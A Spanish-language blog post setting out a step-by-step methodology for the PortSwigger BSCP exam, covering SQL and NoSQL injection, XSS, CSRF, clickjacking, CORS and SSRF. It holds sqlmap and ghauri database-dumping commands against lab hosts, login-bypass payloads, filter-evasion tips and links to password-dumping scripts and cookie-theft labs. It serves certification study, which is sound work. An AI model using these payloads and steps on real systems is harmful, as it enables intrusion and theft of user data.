---
title: Portswigger Exam Methodology
description: Metodología para el examen BSCP de Portswigger
date: 2026-09-02 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Exam
tags:
  - Portswigger Exam
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- BSCP

## SQL injection

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar una SQL injection?

1 - `Instalar` las extensiones `Hackvertor`, `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `SQLmap DNS Collaborator` y `Backslash Powered Scanner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4 - `Interactuar manualmente con todas las funcionalidades del sitio web`. Una vez hecho `revisamos` las `peticiones`, las que consideremos que `tienen insertion points interesantes (cookies, parámetros de consulta, datos por POST) las mandamos al Intruder`, `marcamos las partes que queremos escanear` y `hacemos click derecho > Scan defined insertion points`. Cuando se nos `abra` el `menú` debemos `seleccionar` en `tipo de escaneo` la opción `Audit selected items`

5 - Si hay un `panel de login` podemos intentar `hacer` un `login bypass` con la típica inyección `' or 1=1-- - ` antes de lanzar `sqlmap`, `ghauri` o `escanear los insertion points`

5 - `Analizar la query con sqlmap 2 veces`, debido a que `puede fallar en ocasiones`. `Antes de lanzar sqlmap nos vamos a Burpsuite y cargamos la extensión SQLMap DNS Collaborator y nos copiamos el ese parámetro para usarlo en sqlmap`. Lo `primero` que vamos a `hacer` es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C columna1,columna2 --dump`

```
sudo sqlmap -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --risk=3 --level=5 --dns-domain=9180tced6onerv845e8zg0m8pzvpje.oastify.com --random-agent --batch --insertarParámetrosMencionadosArriba
```

6 - Mientras `sqlmap` está `corriendo`, `analizamos la query con ghauri 2 veces` para `confirmar que sqlmap no se saltó nada`. Lo `primero` que vamos a hacer es `listar la versión con --banner`, `seguidamente la base de datos actual con --current-db`, `luego las bases de datos existentes con --dbs`, `posteriormente seleccionamos la base de datos que nos interese y listamos sus tablas con -D nombreBaseDeDatos --tables`, `lo siguiente es seleccionar la tabla que nos interese y listar sus columnas con -D nombreBaseDeDatos -T nombreTabla --columns` y `finalmente seleccionamos las columnas que nos interesen y dumpeamos su contenido con -D nombreBaseDeDatos -T nombreTabla -C  columna1,columna2 --dump`

```
ghauri -u 'https://0a050082031237258094306d00be0099.web-security-academy.net/' --cookie="TrackingId=pSWRRS0IQHT5vBjp*; session=AQlmdQgzhyO3dxWbUFsAHJCHQzDUK9ST" --level=3 --random-agent --batch --insertarParámetrosMencionadosArriba
```

7 - `Si tenemos algún problema con las queries de ghauri o de sqlmap podemos usar el parámetro --flush-session para borrar todo lo descubierto y empezar de nuevo` o `el parámetro --fresh-queries que hace que sqlmap y ghauri recuerden el punto de inyección pero realizan las queries para listar bases de datos, tablas, columnas etc nuevamente`. Es decir, `si hay problemas a la hora de etectar el punto de inyección, usamos --flush-session` y `si hay problema a la hora de extraer datos usamos --fresh-queries`

8 - `Si vemos que sqlmap o ghauri no pueden ejecutar la consulta bien pero ya hemos detectado la SQLI mediante sqlmap, ghauri o analizando los insertion points`, vamos a `llevar a cabo la explotación manualmente`. Para ayudarnos podemos usar la `cheatsheet` de `SQLI` de `Portswigger` [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y `los posts mencionados en esta sección de la guía` [https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections](https://justice-reaper.github.io/posts/SQLI-Guide/#ejemplos-de-tipos-de-sql-injections). `Si la SQLI que estamos explotando no se da tal cual se muestra en los posts podemos pasarle la cheathseet de SQLI de Portswigger a la IA para que nos ayude a elaborar un payload válido`

9 - `Puede darse el caso en que los datos por POST se transmitan en formato XML`, en estos casos `vamos a hacer la explotación de forma manual`. `Lo más seguro es que no detectemos la SQLI con los escáneres`, así que `vamos a seguir los pasos de este laboratorio` [https://justice-reaper.github.io/posts/SQLI-Lab-18/](https://justice-reaper.github.io/posts/SQLI-Lab-18/) y `a utilizar la IA para adaptar los paylods si se está usando una base de datos diferente a la del ejemplo`

## NoSQL injection

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un NoSQLI?

1 - `Instalar` las extensiones `NoSQLI Scanner` y `Content Type Converter` de `Burpsuite`

2 - Con las extensiones `NoSQLI Scanner` y `Content Type Converter` podemos `cambiar el formato mediante el cual se envían los datos`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`

4 - `Enviamos las peticiones que interesantes al Intruder y escaneamos sus insertion points` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos seleccionar en `tipo de escaneo` la opción `Audit selected items`. Es importante que `no se nos olvide esta ruta https://example.com/user/lookup?user= a la hora de inspeccionar los insertion points`. `Esta ruta normalmente la encuentra el escáner de Burspuite en su escaneo general pero no está mal acceder nosotros manualmente para confirmarlo`. Ademas, `puede ser que necesitemos iniciar sesión para poder acceder a esa ruta`

5 - Con estos dos `escaneos corriendo`, vamos a ver si hay `login` en el que se `envían` los `datos` en `formato JSON` o en `formato x-www-form-urlencoded` podemos intentar `bypassear` el `login` usando estos `payloads` y `acceder` a la `cuenta` del `usuario administrador`. Aunque podamos hacer el `bypass`, `merece la pena intentar dumpear las contraseñas de todos los usuarios, para esto, seguimos las intrucciones que hay más abajo`

HTTP data

```
username[$ne]=null&password[$ne]=null
username[$regex]=^admin&password[$ne]=bar
username[$ne]=null&password[$ne]=null
username[$gt]=undefined&password[$gt]=undefined
username[$gt]=&password[$gt]=
username[$gt]=a&password[$gt]=a
```

JSON data

```
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": "^admin"}, "password": {"$ne": "bar"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username": {"$gt":"a"}, "password": {"$gt":"a"}}
```

6 - `Si el escaneo no identifica nada y tampoco podemos realizar inyecciones en el login`, vamos a `buscar las inyecciones de forma manual`, para ello cuando veamos una `URL` de este estilo `https://example.com/user/lookup?user=` o de este otro `https://example.com/filter?category=`, vamos a `testear los caracteres que se mencionan en la sección` [https://justice-reaper.github.io/posts/NoSQLI-Guide/#detectar-una-syntax-injection-en-mongodb](https://justice-reaper.github.io/posts/NoSQLI-Guide/#detectar-una-syntax-injection-en-mongodb). Primero `enviamos la cadena completa URL encodeada` y luego `enviamos los caracteres uno a uno sin URL encodear`

7 - Una vez `detectada` la `inyección`, vamos a intentar `escapar el carácter que provoca el error con una barra invertida \`. `Si esto provoca algún cambio visual en la web es muy probable que estemos ante una NoSQLI`

8 - Una vez `detectada` la `NoSQLI`, vamos a `enumerar usuarios` y `dumpear sus respectivas contraseñas` usando los scripts `NoSQLI-Password-Dumper.py` [https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-Password-Dumper.py](https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-Password-Dumper.py) y `NoSQLI-User-Enumerator.py` [https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-User-Enumerator.py](https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-User-Enumerator.py) de `NoSQLI Attack Suite`. `Necesitaremos modificar los scripts si se necesita que enviemos una cookie o si los campos que se envían son diferentes a username y password o si se el formato es diferente al empleado` 

9 - `En el caso en el que nos haga falta algún token para poder resetear la contraseña podemos aprovecharnos del operador $where para obtener ese campo del documento`. Para hacer esto podemos usar los scripts `NoSQLI-Field-Dumper-Post-Method.py` [https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-Field-Dumper-Post-Method.py](https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-Field-Dumper-Post-Method.py) y `NoSQLI-Field-Dumper-Get-Method.py` [https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-Field-Dumper-Get-Method.py](https://github.com/Justice-Reaper/NoSQLI-Attack-Suite/blob/main/NoSQLI-Field-Dumper-Get-Method.py) de `NoSQLI Attack Suite` para `obtener` el `token`. `Necesitaremos modificar los scripts si se necesita que enviemos una cookie o si los campos que se envían son diferentes a username y password o si se el formato es diferente al empleado`

## Cross-site scripting (XSS)

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un XSS?

1 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere` y `Backslash Powered Scanner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Interactuar` con todas las `funcionalidades` de la web `manualmente` y `crawlear` el `dominio` con `Burpsuite`

4 - `Revisar` todas las `peticiones` y `escanear` todos los `insertion points`. Respecto a los `insertion points`, debemos de `lanzar` un `escaneo` a `peticiones` por `GET` a la `raíz /` aunque no haya nada en la `URL`, por ejemplo, si vemos esto en Bursputie `GET / HTTP/2` ahí tenemos que `lanzar` un `escaneo` y `también debemos hacerlo con peticiones así GET /? HTTP/2`. El `?` lo `añadimos` nosotros `manualmente` y el `insertion point` está justó después de la `?`

5 - Usamos el `Dom Invader` con las `opciones bien configuradas` para detectar `XSS` y metemos su `payload` en todos los puntos en los que podemos `introducir datos`, para ver si nos `detecta` algún `sink`

6 - Si no encontramos nada, vamos a `inspeccionar manualmente` los `archivos JavaScript` que `se nos han cargado después de interactuar con todas las funcionalidades del sitio web`. Podemos pedir a la `IA` que lo `analice` para `ver si ve algo que nos permita explotar un XSS`. Si vemos algún `archivo` que `usa` un `framework` como `Angular`, vamos a `poner al inicio del diccionario los payloads específicos para ese framework`

7 - Si no hay nada, vamos a `introducir` un `payload simple` como este `<h1>test</h1>`, en `todos los puntos en los que podemos introducir datos` y posteriormente vamos a `mirar` el `código fuente` a ver si podemos `escapar nuestro payload` y `lograr` que se `ejecute`. Para esto también podemos `utilizar` la `IA`

8 - Una aclaración respecto a `XSS Hunter`, si la `web` utiliza `HTTP/1.1` tenemos que `urlencodear` los `payloads`. Si lo anterior no ha funcionado, vamos a utilizar la herramienta `XSS-Hunter` junto con este `diccionario` [https://raw.githubusercontent.com/coffinxp/loxs/refs/heads/main/payloads/xss.txt](https://raw.githubusercontent.com/coffinxp/loxs/refs/heads/main/payloads/xss.txt). Este `diccionario` vamos a `modificarlo` y a `insertarle al inicio los payloads de todos los laboratorios de XSS`. Respecto a `XSS-Hunter`, debemos de `lanzarlo` en una `petición` por `GET` a la `raíz /`, `aunque no haya nada en la URL`, por ejemplo, si vemos esto en Bursputie `GET / HTTP/2` ahí tenemos que `lanzarlo` y también debemos hacerlo con `peticiones` así `GET /? HTTP/2`. El `?` lo `añadimos` nosotros `manualmente` y fuzzeamos con `XSS-Hunter` justo `después` de la `?` 

9 - Ahora vamos a `hacer unas aclaraciones importantes sobre los puntos anteriores`. Lo primero, `cuando nos encontremos un formulario` es probable que `campos` como el `email` o el `enlace a una web` necesiten `cumplir` un `patrón exacto` para `considerarse válidos`. Tenemos que `enviar` la `petición` desde `Burpsuite` y `comprobar si nos sigue pidiendo que cumplamos con cierto patrón`. `Si no nos pide que cumplamos con el patrón`, puede haber un `XSS` ahí. Hay otros casos en los que puede haber un `XSS` aunque tengamos que usar un `enlace a una web`, por ejemplo este `http://payloadXSS`

`Segundo punto`, si se `envían datos` por `POST` con esta estructura `productId=1&storeId=London` y en la `URL` de la `web` vemos una `petición` por `GET` a `/product?productId=1` nos `devuelve` un `producto`, podemos intentar `añadir` en la `URL` el `storeId` que se ha `enviado` por `POST` y `buscar en la URL resultante un XSS /product?productId=1&storeId=FuzzearXSS`. Aquí lanzaríamos `primero` un `análisis del insertion point` y luego lanzaríamos `XSS-Hunter`

`Tercer punto`, cuando usemos `XSS Hunter` hay que `revisar si las respuestas nos dicen algo como tag blocked o event blocked`. Si esto pasa, vamos a `mandar` la `peticion` al `Intruder` con este payload `<test>probando</test>`, vamos a `inyectar` un `payload` en que sustituya `test` y vamos a `fuzzear los tags o events para saber cuales están permitidos`. Para `fuzzear` vamos a usar esta `cheatsheet` [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). `Una vez sepamos los tags y events que podemos usar`, vamos a `copiarnos` los `payloads` de la `cheatsheet` que `cumplan` estas `condiciones` y vamos a `comprobar si funcionan con XSS Hunter`. `Si nos sigue bloqueando los events o los tags, podemos probar a escribirlos así oNlOaD`. Eso último lo hacemos para `intentar bypassear el filtrado que se puede estar aplicando` 

10 - Una vez hemos `detectado` el `XSS`, `tenemos 3 opciones`, usarlo para `robar las cookies de la víctima` [https://justice-reaper.github.io/posts/XSS-Lab-22/](https://justice-reaper.github.io/posts/XSS-Lab-22/), usarlos para `capturar las credenciales de la víctima` [https://justice-reaper.github.io/posts/XSS-Lab-23/](https://justice-reaper.github.io/posts/XSS-Lab-23/) o usarlo para `ejecutar acciones en nombre de la víctima` [https://justice-reaper.github.io/posts/XSS-Lab-24/](https://justice-reaper.github.io/posts/XSS-Lab-24/)

11 - `Si tenemos duda con los pasos anteriores podemos leer estos posts`:

Reflected XSS into HTML context with nothing encoded: [https://justice-reaper.github.io/posts/XSS-Lab-1/](https://justice-reaper.github.io/posts/XSS-Lab-1/)

Stored XSS into HTML context with nothing encoded: [https://justice-reaper.github.io/posts/XSS-Lab-2/](https://justice-reaper.github.io/posts/XSS-Lab-2/)

DOM XSS in document.write sink using source location.search: [https://justice-reaper.github.io/posts/XSS-Lab-3/](https://justice-reaper.github.io/posts/XSS-Lab-3/)

DOM XSS in innerHTML sink using source location.search: [https://justice-reaper.github.io/posts/XSS-Lab-4/](https://justice-reaper.github.io/posts/XSS-Lab-4/)

DOM XSS in jQuery anchor href attribute sink using location.search source: [https://justice-reaper.github.io/posts/XSS-Lab-5/](https://justice-reaper.github.io/posts/XSS-Lab-5/)

DOM XSS in jQuery selector sink using a hashchange event: [https://justice-reaper.github.io/posts/XSS-Lab-6/](https://justice-reaper.github.io/posts/XSS-Lab-6/)

Reflected XSS into attribute with angle brackets HTML-encoded: [https://justice-reaper.github.io/posts/XSS-Lab-7/](https://justice-reaper.github.io/posts/XSS-Lab-7/)

Stored XSS into anchor href attribute with double quotes HTML-encoded: [https://justice-reaper.github.io/posts/XSS-Lab-8/](https://justice-reaper.github.io/posts/XSS-Lab-8/)

Reflected XSS into a JavaScript string with angle brackets HTML encoded: [https://justice-reaper.github.io/posts/XSS-Lab-9/](https://justice-reaper.github.io/posts/XSS-Lab-9/)

DOM XSS in document.write sink using source location.search inside a select element: [https://justice-reaper.github.io/posts/XSS-Lab-10/](https://justice-reaper.github.io/posts/XSS-Lab-10/)

DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded: [https://justice-reaper.github.io/posts/XSS-Lab-11/](https://justice-reaper.github.io/posts/XSS-Lab-11/)

Reflected DOM XSS: [https://justice-reaper.github.io/posts/XSS-Lab-12/](https://justice-reaper.github.io/posts/XSS-Lab-12/)

Stored DOM XSS: [https://justice-reaper.github.io/posts/XSS-Lab-13/](https://justice-reaper.github.io/posts/XSS-Lab-13/)

Reflected XSS into HTML context with most tags and attributes blocked: [https://justice-reaper.github.io/posts/XSS-Lab-14/](https://justice-reaper.github.io/posts/XSS-Lab-14/)

Reflected XSS into HTML context with all tags blocked except custom ones: [https://justice-reaper.github.io/posts/XSS-Lab-15/](https://justice-reaper.github.io/posts/XSS-Lab-15/)

Reflected XSS with some SVG markup allowed: [https://justice-reaper.github.io/posts/XSS-Lab-16/](https://justice-reaper.github.io/posts/XSS-Lab-16/)

Reflected XSS in canonical link tag: [https://justice-reaper.github.io/posts/XSS-Lab-17/](https://justice-reaper.github.io/posts/XSS-Lab-17/)

Reflected XSS into a JavaScript string with single quote and backslash escaped: [https://justice-reaper.github.io/posts/XSS-Lab-18/](https://justice-reaper.github.io/posts/XSS-Lab-18/)

Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped: [https://justice-reaper.github.io/posts/XSS-Lab-19/](https://justice-reaper.github.io/posts/XSS-Lab-19/)

Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped: [https://justice-reaper.github.io/posts/XSS-Lab-20/](https://justice-reaper.github.io/posts/XSS-Lab-20/)

Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped: [https://justice-reaper.github.io/posts/XSS-Lab-21/](https://justice-reaper.github.io/posts/XSS-Lab-21/)

Exploiting cross-site scripting to steal cookies: [https://justice-reaper.github.io/posts/XSS-Lab-22/](https://justice-reaper.github.io/posts/XSS-Lab-22/)

Exploiting cross-site scripting to capture passwords: [https://justice-reaper.github.io/posts/XSS-Lab-23/](https://justice-reaper.github.io/posts/XSS-Lab-23/)

Exploiting XSS to bypass CSRF defenses: [https://justice-reaper.github.io/posts/XSS-Lab-24/](https://justice-reaper.github.io/posts/XSS-Lab-24/)

## CSRF

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un CSRF?

1 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere`, `Backslash Powered Scanner` y `CSRF Scanner` de `Burpsuite` 

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Iniciar sesión` e `interactuar manualmente con todas las funcionalidades del sitio web`

4 - `Buscar` en el `HTTP history`, `WebSockets history` y en el `Site map` todas las `peticiones` para ver si `encontramos alguna interesante`. Buscamos `sibling domains`, `archivos JavaScript que puedan dar luegar a open redirects o XSS` y `peticiones` que `ejecuten` una `acción importante` como `cambiar` el `correo electrónico`. `Una vez encontradas este tipo de peticiones tenemos que escanear sus insertion points`

5 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`. Esto nos puede `ayudar` a `detectar` un `CSRF` pero `puede fallar en ocasiones`, así que `conviene hacer también una inspección manual`

6 - `Debido a que tantas variables que tiene esta vulnerabilidad, es preferible probar todas las técnicas vistas en vez de seguir una metodología concreta`

- CSRF vulnerability with no defenses: [https://justice-reaper.github.io/posts/CSRF-Lab-1/](https://justice-reaper.github.io/posts/CSRF-Lab-1/)

- CSRF where token validation depends on request method: [https://justice-reaper.github.io/posts/CSRF-Lab-2/](https://justice-reaper.github.io/posts/CSRF-Lab-2/)

- CSRF where token validation depends on token being present: [https://justice-reaper.github.io/posts/CSRF-Lab-3/](https://justice-reaper.github.io/posts/CSRF-Lab-3/)

- CSRF where token is not tied to user session: [https://justice-reaper.github.io/posts/CSRF-Lab-4/](https://justice-reaper.github.io/posts/CSRF-Lab-4/)

- CSRF where token is tied to non-session cookie: [https://justice-reaper.github.io/posts/CSRF-Lab-5/](https://justice-reaper.github.io/posts/CSRF-Lab-5/)

- CSRF where token is duplicated in cookie: [https://justice-reaper.github.io/posts/CSRF-Lab-6/](https://justice-reaper.github.io/posts/CSRF-Lab-6/)

- SameSite Lax bypass via method override: [https://justice-reaper.github.io/posts/CSRF-Lab-7/](https://justice-reaper.github.io/posts/CSRF-Lab-7/)

- SameSite Strict bypass via client-side redirect: [https://justice-reaper.github.io/posts/CSRF-Lab-8/](https://justice-reaper.github.io/posts/CSRF-Lab-8/)

- SameSite Strict bypass via sibling domain: [https://justice-reaper.github.io/posts/CSRF-Lab-9/](https://justice-reaper.github.io/posts/CSRF-Lab-9/)

- SameSite Lax bypass via cookie refresh: [https://justice-reaper.github.io/posts/CSRF-Lab-10/](https://justice-reaper.github.io/posts/CSRF-Lab-10/)

- CSRF where Referer validation depends on header being present: [https://justice-reaper.github.io/posts/CSRF-Lab-11/](https://justice-reaper.github.io/posts/CSRF-Lab-11/)

- CSRF with broken Referer validation: [https://justice-reaper.github.io/posts/CSRF-Lab-12/](https://justice-reaper.github.io/posts/CSRF-Lab-12/)

## Clickjacking

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un clickjacking?

Es posible `detectar` una web `vulnerable` a `clickjacking` de varias formas. En mi caso sigo estos pasos

1 - Usaremos herramientas como `Security Headers` o `Shcheck` para `identificar` las `cabeceras de seguridad` de una `web` y comprobar si faltan `Content-Security-Policy (CSP)` y `X-Frame-Options`, lo que permitiría `cargar` la `web` dentro de un `iframe`

2 - Abrimos las `herramientas de desarrollador` de `Chrome` para comprobar si la `acción` que vamos a `ejecutar` necesita la `cookie de sesión`

3 - Si la `acción` necesita la `cookie de sesión`, revisamos el atributo `SameSite` de dicha `cookie`. El `ataque` solo será `viable` en alguno de estos casos:

- La `cookie` usa `SameSite=None`, por lo que el `navegador` la envía dentro del `iframe cross-site`

- La `acción` no requiere `autenticación`, por lo que no necesita `cookie`

- La aplicación es una `SPA` que guarda el `token de sesión` en `localStorage`/`sessionStorage`, donde `SameSite` no tiene efecto

Por el contrario, si la `cookie` usa `SameSite=Lax` (el valor por `defecto` en `Chrome`) o `SameSite=Strict`, el `navegador` no la enviará dentro del `iframe` y el `ataque fallará`

4 - `Creamos` un `PoC` usando `Clickbandit`

5 - Si tenemos `dudas` con los `pasos anteriores` podemos `consultar` estos `posts`:

- Basic clickjacking with CSRF token protection: [https://justice-reaper.github.io/posts/Clickjacking-Lab-1/](https://justice-reaper.github.io/posts/Clickjacking-Lab-1/)

- Clickjacking with form input data prefilled from a URL parameter: [https://justice-reaper.github.io/posts/Clickjacking-Lab-2/](https://justice-reaper.github.io/posts/Clickjacking-Lab-2/)

- Clickjacking with a frame buster script: [https://justice-reaper.github.io/posts/Clickjacking-Lab-3/](https://justice-reaper.github.io/posts/Clickjacking-Lab-3/)

- Exploiting clickjacking vulnerability to trigger DOM based XSS: [https://justice-reaper.github.io/posts/Clickjacking-Lab-4/](https://justice-reaper.github.io/posts/Clickjacking-Lab-4/)

- Multistep clickjacking: [https://justice-reaper.github.io/posts/Clickjacking-Lab-5/](https://justice-reaper.github.io/posts/Clickjacking-Lab-5/)

## CORS

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar una mala configuración de CORS?

1 - `Instalar` las extensiones `CORS* - Additional CORS Checks` y `Trusted Domain CORS Scanner` de `Burpsuite` 

2 - Nos `dirigimos` a la `pestaña CORS*` que `corresponde` a la extensión `CORS* - Additional CORS Checks` y `checkeamos Activate CORS*?`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Iniciamos sesión, interactuamos con todas las funciones del sitio web` y posteriormente `crawleamos` el `dominio` con `Burpsuite`

4 - `Filtramos` en el `HTTP history` y en el `Logger` por `Access-Control-Allow-Credentials`. Es `importante` esta `cabecera` porque `para poder explotar esta vulnerabilidad necesitamos encontrar un endpoint que contenga información sensible y que al hacerle una petición veamos la cabecera Access-Control-Allow-Credentials: true en la respuesta`

5 - `Si en este punto la extensión CORS* - Additional CORS Check no nos ha reportado nada y no hemos encontrado ningún petición que tenga en la respuesta esta cabecera Access-Control-Allow-Credentials, no podemos explotar la mala configuración de CORS`

6 - En caso de que sí hayamos `encontrado` una `petición` con la cabecera `Access-Control-Allow-Credentials` en la `respuesta` podemos hacer `tests manuales`. Lo `primero` es `enviar` la `petición` al `Repeater` y desde ahí hacemos `click derecho > Extensions > CORS*, Additional CORS Checks > Add Requests to CORSA*`. Luego nos `dirigimos` a la `pestaña CORS*`, `seleccionamos la request que acabamos de enviar` y `pulsamos sobre Send CORS request for selected entry`. Una vez `identificada` la `vulnerabilidad` vamos a `seguir los pasos de uno de estos laboratorios (dependiendo del valor de la cabecera Origin tendremos que seguir los pasos de uno u otro)`:

- CORS vulnerability with basic origin reflection: [https://justice-reaper.github.io/posts/CORS-Lab-1/](https://justice-reaper.github.io/posts/CORS-Lab-1/)

- CORS vulnerability with trusted null origin: [https://justice-reaper.github.io/posts/CORS-Lab-2/](https://justice-reaper.github.io/posts/CORS-Lab-2/)

7 - `Si tenemos varios dominios/subdominios hacemos click derecho > Extensions > Trusted Domain CORS Scanner y cuando se nos abra una pestaña, añadimos ahí todos los dominios y subdominios conocidos`. `Si el escáner nos identifica que un dominio o subdominio que hemos encontrado es de confianza`, lo que debemos de hacer es `buscar` un `XSS` en `él`. Para `identificar` los `XSS`, debemos `revisar` la `guía de XSS` [https://justice-reaper.github.io/posts/XSS-Guide/](https://justice-reaper.github.io/posts/XSS-Guide/). En este `laboratorio` podemos ver `como llevar a cabo ese proceso`:

- CORS vulnerability with trusted insecure protocols: [https://justice-reaper.github.io/posts/CORS-Lab-3/](https://justice-reaper.github.io/posts/CORS-Lab-3/)

8 - `Una vez hayamos confirmado que la web es tiene CORS mal configurado`, lo que tenemos que hacer `crear` una `Poc`. Para hacer esto `podemos crear la PoC con la herramienta C0rsPwn3r` o `usar las mismas que en los laboratorios mencionados`

## SSRF

### Cheatsheet

Usaremos estas `cheatsheet` para facilitar la `detección` y `explotación` de esta `vulnerabilidad`:

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### ¿Cómo detectar y explotar un SSRF?

1 - `Instalar` las extensiones `Active Scan ++`, `Error Message Checks`, `Additional Scanner Checks`, `Collaborator Everywhere` y `Backslash Powered Scanner` de `Burpsuite`

2 - `Añadir` el `dominio` y sus `subdominios` al `scope`

3 - `Crawleamos` el `dominio` con `Burpsuite` e `interactuamos manualmente con todas las funcionalidades del sitio web`

4 - `Buscamos peticiones interesantes en el HTTP history y en el Site map` y `escaneamos partes específicas de estas peticiones` usando el `escáner de Burpsuite`. Para `escanear` los `insertion points` debemos `enviar` la `petición` al `Intruder`, `marcar las posiciones que queremos que sean escaneadas` y `seleccionar` en `tipo de escaneo` la opción `Audit selected items`

5 - Hacer un `escaneo general` con `Burpsuite`. Como `tipo de escaneo` marcaremos `Crawl and audit` y como `configuración de escaneo` usaremos `Deep`. El `paso anterior` es el `encargado` de `encontrar` el `SSRF` y `este paso nos sirve para ver si hay un open redirect`

6 - Una vez `identificada` la `vulnerabilidad`, debemos tener en cuenta que `en el examen, el servicio se encuentra en el localhost y puerto 6566 de la máquina víctima`. Para `acceder` a este `servicio` debemos `realizar` una `petición` a `http://localhost:6566`

7 - Puede ser que se nos `devuelva algún código de estado o error diferente` indicando que hay alguna `dirección IP blacklisteada`. Para estas situaciones usaremos la extensión `Encode IP` de `Burpsuite` y las herramientas `Ipfuscator` y `SSRF Payload Generator`, en ese orden. En el caso en el que esté la dirección `127.0.0.1` o el `localhost` blacklistado podemos usar la `cheatsheet de Portswigger` [https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet) o `SSRF PayloadMaker`

8 - Si recibimos un `código de estado o error diferente` indicando que hay alguna `dirección ruta blacklisteada`, podemos usar `Recollapse` para efectuar un `bypass`. En el caso de no funcionar, deberemos echar un vistazo primeramente a esta `guía de ofuscación` [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/)

9 - Si tenemos `dudas` con los `pasos anteriores` podemos `consultar` estos `posts`:

- Basic SSRF against the local server: [https://justice-reaper.github.io/posts/SSRF-Lab-1/](https://justice-reaper.github.io/posts/SSRF-Lab-1/)

- Basic SSRF against another back-end system: [https://justice-reaper.github.io/posts/SSRF-Lab-2/](https://justice-reaper.github.io/posts/SSRF-Lab-2/)

- Blind SSRF with out-of-band detection: [https://justice-reaper.github.io/posts/SSRF-Lab-3/](https://justice-reaper.github.io/posts/SSRF-Lab-3/)

- SSRF with blacklist-based input filter: [https://justice-reaper.github.io/posts/SSRF-Lab-4/](https://justice-reaper.github.io/posts/SSRF-Lab-4/)

